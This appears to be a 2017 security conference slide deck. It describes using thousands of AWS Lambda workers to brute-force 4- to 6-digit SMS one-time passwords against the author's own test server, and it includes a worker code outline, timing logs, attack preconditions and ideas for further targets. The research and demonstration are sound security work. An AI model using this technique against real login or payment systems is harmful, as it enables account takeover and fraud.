Load SMS OTP page
●
Capture HTTP request with SMS OTP value
●
Load request into thunderstruck
●
Get correct value and continue session in 
browser
Complete all the steps within 100 seconds
Good use case for FaaS?
Architecture
1) Store random OTP value
2) Clear OTP guess counter
3) Keep asking 
for OTP result
5) Guess OTP
6) Check OTP
7) Increment 
guess counter
4) Trigger workers
8) Report 
correct OTP
9) Report brute 
force complete
Google App Engine (1/2)
First we need a test server that can handle 
1,000,000 requests in 60 seconds
~16,667 requests/second
200 instances to handle the requests
Google App Engine (2/2)
Memcache backend:
●
Check if OTP guess is correct
●
Track OTP guesses
$ gcloud app deploy
Function
$ cat ./trigger_worker_aws.py
# setup test server
“https://otp.appspot.com/?setotp=” + random(...)
start_time = datetime(...)
def wait_for_result(...)
while Elasticsearch(...).get(...)
time.sleep(1)
print(“OTP is 123456 \o/”)
# invoke Lambda function
multiprocessing.Pool(...)
boto3.client('lambda').invoke(...)
wait_for_result(...)
print(“time taken:” + datetime(...) - start_time )
$ cat ./worker.py
*Python multiprocessing Pool and Queue won't 
work on AWS Lambda*
def lambda_handler(...)
def brute_otp(...)
multiprocessing.Process(brute_otp_run, ...)
def brute_otp_run(...)
response = requests.get(url+otp)
if success_match in response:
add_result_to_es(response)
if done_match in response:
add_job_to_es(response)
def add_result_to_es(...)
def add_job_to_es(...)
Testing
https://smsotp.appspot.com/?setotp=013370
Stored OTP: 013370
Enter the OTP in the parameter 'otp'
otp guessed: 0/1000000
https://smsotp.appspot.com/?otp=123456
Stored OTP: 013370
OTP is wrong, try again
otp guessed: 1/1000000
https://smsotp.appspot.com/?otp=013370
Stored OTP: 013370
Success the correct OTP is: 013370
otp guessed: 2/1000000
Now we have a working test server to simulate 
the brute force attack within 100 seconds
Brute-force 4 digits - 100 workers (100/worker)
======[OTP LENGTH 4]===========
setting random OTP value of length: 4 - OTP value is: 8763
server is ready, starting brute force of OTP
Need to spawn 100.0 workers to guess otp [0-9] of length 4 with 100 otp per worker
32 processes to start 7.14285714286 workers for each of the 14 regions
continue?
2017-07-09 16:28:29.478689 - starting brute_otp
Started job id: 91ada05a-eea6-4eb6-b79b-78fe8a347ee1
2017-07-09 16:28:29.480830 - starting workers
2017-07-09 16:28:29.484356 - waiting for answer in elasticsearch
2017-07-09 16:28:31.547423 - done starting workers
finished starting workers in 0:00:02.066530
2017-07-09 16:28:41.808053 - got answer from elasticsearch
{u'otp_value': u'8763'}
found OTP in 0:00:12.329502
2017-07-09 16:28:41.811278 - waiting for job to complete
2017-07-09 16:28:56.023307 - job completed
brute_otp finished in 0:00:26.544594
Brute-force 4 digits - 200 workers (50/worker)
======[OTP LENGTH 4]===========
setting random OTP value of length: 4 - OTP value is: 2577
server is ready, starting brute force of OTP
Need to spawn 200.0 workers to guess otp [0-9] of length 4 with 50 otp per worker
32 processes to start 14.2857142857 workers for each of the 14 regions
continue?
2017-07-09 16:27:42.543748 - starting brute_otp
Started job id: 0bd95391-641b-4c28-b618-634bda7941e5
2017-07-09 16:27:42.546869 - starting workers
2017-07-09 16:27:42.550619 - waiting for answer in elasticsearch
2017-07-09 16:27:44.694512 - done starting workers
finished starting workers in 0:00:02.147645
2017-07-09 16:27:53.474901 - got answer from elasticsearch
{u'otp_value': u'2577'}
found OTP in 0:00:10.931181
2017-07-09 16:27:53.478134 - waiting for job to complete
2017-07-09 16:27:54.327960 - job completed
brute_otp finished in 0:00:11.784056
Brute-force 4 digits - 400 workers (25/worker)
======[OTP LENGTH 4]===========
setting random OTP value of length: 4 - OTP value is: 2167
server is ready, starting brute force of OTP
Need to spawn 400.0 workers to guess otp [0-9] of length 4 with 25 otp per worker
32 processes to start 28.5714285714 workers for each of the 14 regions
continue?
2017-07-09 16:26:58.884780 - starting brute_otp
Started job id: 685b617a-9986-4f6f-bd1a-4f563f545b58
2017-07-09 16:26:58.888718 - starting workers
2017-07-09 16:26:58.892609 - waiting for answer in elasticsearch
2017-07-09 16:27:01.999699 - done starting workers
finished starting workers in 0:00:03.111037
2017-07-09 16:27:04.825824 - got answer from elasticsearch
{u'otp_value': u'2167'}
found OTP in 0:00:05.941202
2017-07-09 16:27:04.829593 - waiting for job to complete
2017-07-09 16:27:06.544043 - job completed
brute_otp finished in 0:00:07.659145
Brute-force 5 digits - 1,000 workers (100/worker)
======[OTP LENGTH 5]===========
setting random OTP value of length: 5 - OTP value is: 92827
server is ready, starting brute force of OTP
Need to spawn 1000.0 workers to guess otp [0-9] of length 5 with 100 otp per worker
32 processes to start 71.4285714286 workers for each of the 14 regions
continue?
2017-07-09 16:22:49.462012 - starting brute_otp
Started job id: 8fc3d024-ba49-4ecb-ada0-5660935a87bf
2017-07-09 16:22:49.468667 - starting workers
2017-07-09 16:22:49.470290 - waiting for answer in elasticsearch
2017-07-09 16:22:55.765072 - done starting workers
finished starting workers in 0:00:06.296480
2017-07-09 16:23:10.736533 - got answer from elasticsearch
{u'otp_value': u'92827'}
found OTP in 0:00:21.274614
2017-07-09 16:23:10.739454 - waiting for job to complete
2017-07-09 16:24:30.031556 - job completed
brute_otp finished in 0:01:40.569551
Brute-force 5 digits - 2,000 workers (50/worker)
======[OTP LENGTH 5]===========
setting random OTP value of length: 5 - OTP value is: 15202
server is ready, starting brute force of OTP
Need to spawn 2000.0 workers to guess otp [0-9] of length 5 with 50 otp per worker
32 processes to start 142.857142857 workers for each of the 14 regions
continue?
2017-07-09 16:15:41.324104 - starting brute_otp
Started job id: be84d27a-bd77-4dde-95a1-802dde9796fa
2017-07-09 16:15:41.336814 - starting workers
2017-07-09 16:15:41.339787 - waiting for answer in elasticsearch
2017-07-09 16:15:47.890910 - got answer from elasticsearch
{u'otp_value': u'15202'}
found OTP in 0:00:06.567002
2017-07-09 16:15:51.180059 - done starting workers
finished starting workers in 0:00:09.843286
2017-07-09 16:15:51.180274 - waiting for job to complete
2017-07-09 16:16:53.400075 - job completed
brute_otp finished in 0:01:12.075939
Brute-force 5 digits - 4,000 workers (25/worker)
======[OTP LENGTH 5]===========
setting random OTP value of length: 5 - OTP value is: 36033
server is ready, starting brute force of OTP
Need to spawn 4000.0 workers to guess otp [0-9] of length 5 with 25 otp per worker
32 processes to start 285.714285714 workers for each of the 14 regions
continue?
2017-07-09 16:14:25.121882 - starting brute_otp
Started job id: 8c903f9d-8036-41a2-b9f8-8444b9e2523d
2017-07-09 16:14:25.131402 - starting workers
2017-07-09 16:14:25.133104 - waiting for answer in elasticsearch
2017-07-09 16:14:36.006256 - got answer from elasticsearch
{u'otp_value': u'36033'}
found OTP in 0:00:10.884596
2017-07-09 16:14:43.876436 - done starting workers
finished starting workers in 0:00:18.745044
2017-07-09 16:14:43.876572 - waiting for job to complete
2017-07-09 16:14:49.328035 - job completed
brute_otp finished in 0:00:24.206181
Brute-force 6 digits - 10,000 workers (100/worker)
======[OTP LENGTH 6]===========
setting random OTP value of length: 6 - OTP value is: 132103
server is ready, starting brute force of OTP
Need to spawn 10000.0 workers to guess otp [0-9] of length 6 with 100 otp per worker
32 processes to start 714.285714286 workers for each of the 14 regions
continue?
2017-07-09 16:29:46.701166 - starting brute_otp
Started job id: 70961810-964d-4b62-8c34-8b4dbd9e3e0b
2017-07-09 16:29:46.732705 - starting workers
2017-07-09 16:29:46.735767 - waiting for answer in elasticsearch
2017-07-09 16:30:17.796209 - got answer from elasticsearch
{u'otp_value': u'132103'}
found OTP in 0:00:31.097981
2017-07-09 16:30:33.161660 - done starting workers
finished starting workers in 0:00:46.429033
2017-07-09 16:30:33.161845 - waiting for job to complete
2017-07-09 16:33:30.035312 - job completed
brute_otp finished in 0:03:43.334052
~500k attempts in 
first 60 seconds
Brute-force 6 digits - 10,000 workers (100/worker)
======[OTP LENGTH 6]===========
setting random OTP value of length: 6 - OTP value is: 365313
server is ready, starting brute force of OTP
Need to spawn 10000.0 workers to guess otp [0-9] of length 6 with 100 otp per worker
32 processes to start 714.285714286 workers for each of the 14 regions
continue?
2017-07-09 16:59:26.960930 - starting brute_otp
Started job id: 48b6c6d6-23c5-46c9-82b5-171605d9e4b7
2017-07-09 16:59:26.980960 - starting workers
2017-07-09 16:59:26.983994 - waiting for answer in elasticsearch
2017-07-09 17:00:08.949795 - got answer from elasticsearch
{u'otp_value': u'365313'}
found OTP in 0:00:41.989282
2017-07-09 17:00:20.354010 - done starting workers
finished starting workers in 0:00:53.373069
2017-07-09 17:00:20.354184 - waiting for job to complete
2017-07-09 17:04:14.738054 - job completed
brute_otp finished in 0:04:47.777224
41 seconds
Brute-force 6 digits - 20,000 workers (50/worker)
======[OTP LENGTH 6]===========
setting random OTP value of length: 6 - OTP value is: 848028
server is ready, starting brute force of OTP
Need to spawn 20000.0 workers to guess otp [0-9] of length 6 with 50 otp per worker
32 processes to start 1666.66666667 workers for each of the 12 regions
continue?
2017-07-09 17:31:04.042149 - starting brute_otp
Started job id: 3ada0c03-2098-4bb7-81a6-59fc23aa13e4
2017-07-09 17:31:04.105770 - starting workers
2017-07-09 17:31:04.115192 - waiting for answer in elasticsearch
2017-07-09 17:32:20.495622 - got answer from elasticsearch
{u'otp_value': u'848028'}
found OTP in 0:01:16.453610
2017-07-09 17:32:41.689405 - done starting workers
finished starting workers in 0:01:37.583704
2017-07-09 17:32:41.689607 - waiting for job to complete
2017-07-09 17:33:05.983280 - job completed
brute_otp finished in 0:02:01.941091
12 regions
Geographically closer to test server
76 seconds
Brute-force 6 digits - 40,000 workers (25/worker)
======[OTP LENGTH 6]===========
setting random OTP value of length: 6 - OTP value is: 636555
server is ready, starting brute force of OTP
Need to spawn 40000.0 workers to guess otp [0-9] of length 6 with 25 otp per worker
32 processes to start 2857.14285714 workers for each of the 14 regions
continue?
2017-07-09 17:35:32.440217 - starting brute_otp
Started job id: ba9211e5-9f30-4d36-8182-8c1a1638ef6b
2017-07-09 17:35:32.512530 - starting workers
2017-07-09 17:35:32.520186 - waiting for answer in elasticsearch
2017-07-09 17:36:40.556626 - got answer from elasticsearch
{u'otp_value': u'636555'}
found OTP in 0:01:08.116940
2017-07-09 17:38:58.294490 - done starting workers
finished starting workers in 0:03:25.782006
2017-07-09 17:38:58.294680 - waiting for job to complete
2017-07-09 17:39:40.461517 - job completed
brute_otp finished in 0:04:08.021226
68 seconds
Brute-force 6 digits - 20,000 workers (50/worker)
======[OTP LENGTH 6]===========
setting random OTP value of length: 6 - OTP value is: 080514
server is ready, starting brute force of OTP
Need to spawn 20000.0 workers to guess otp [0-9] of length 6 with 50 otp per worker
32 processes to start 4000.0 workers for each of the 5 regions
continue?
2017-07-09 17:43:03.199781 - starting brute_otp
Started job id: 7c632fe4-b75c-4727-939b-bbf0c44acf6b
2017-07-09 17:43:03.250565 - starting workers
2017-07-09 17:43:03.260273 - waiting for answer in elasticsearch
2017-07-09 17:44:40.776670 - done starting workers
finished starting workers in 0:01:37.526133
2017-07-09 17:44:44.977822 - got answer from elasticsearch
{u'otp_value': u'080514'}
found OTP in 0:01:41.778138
2017-07-09 17:44:44.985564 - waiting for job to complete
2017-07-09 17:45:21.050496 - job completed
brute_otp finished in 0:02:17.850548
5 regions (same geo area)
Some requests dropped by 
overloaded test server :(
101 seconds
Demo
6 digit OTP
Test server: Google App Engine (Python) with 200 instances of type B1
Possible to guess OTP based on ~500k attempts in 60 seconds
Requirements:
●
The ability to keep guessing (no account lockout)
●
Server that can handle 10k requests per second (~16.6k in theory)
●
Best if attack comes from same geographic region
●
Need a bit of luck
Summary
Code: 
https://github.com/ryanbaxendale/thunderstruck-
demo/tree/master/sms.otp
Verified by Visa Acquirer and Merchant 
Implementation Guide
Chapter 6: Merchant Server Plug-In Functions:
“The Payer Authentication Request/Response 
message pair has a recommended timeout value 
of 5 minutes, recognizing that cardholders may 
become distracted while completing the 
authentication.”
Going further
●
8 digit SMS OTP
●
3 minutes (180 seconds)
●
Need a more scalable test server
Other attacks:
●
Unauth password reset URLs
●
Account signup/registration
Further work
Interesting
lambdash: AWS Lambda Shell Hack
By Eric Hammond
https://github.com/alestic/lambdash
Run shell commands using node.js
CCC 2016
Gone in 60 Milliseconds
Intrusion and Exfiltration in Server-less 
Architectures
DEF CON 25
Starting the Avalanche: Application DoS In 
Microservice Architectures
Blackhat US 2017
Hacking Serverless Runtimes: Profiling AWS 
Lambda Azure Functions and more
Blackhat US 2016
Account Jumping Post Infection Persistency & 
Lateral Movement In AWS
Going further
AWS Lambda - High mem: 1536 MB
266,667/seconds/month free
Aliyun / Alibaba Cloud - China
Need to register with +86 mobile number
IBM OpenWhisk
Docker
Build your own FaaS infrastructure
https://github.com/alexellis/faas
●
UI portal
●
Setup with one script
●
Any process that can run in Docker can be 
a serverless function
●
Prometheus metrics and logging
●
Auto-scales as demand increases
github.com/ryanbaxendale/thunderstruck-demo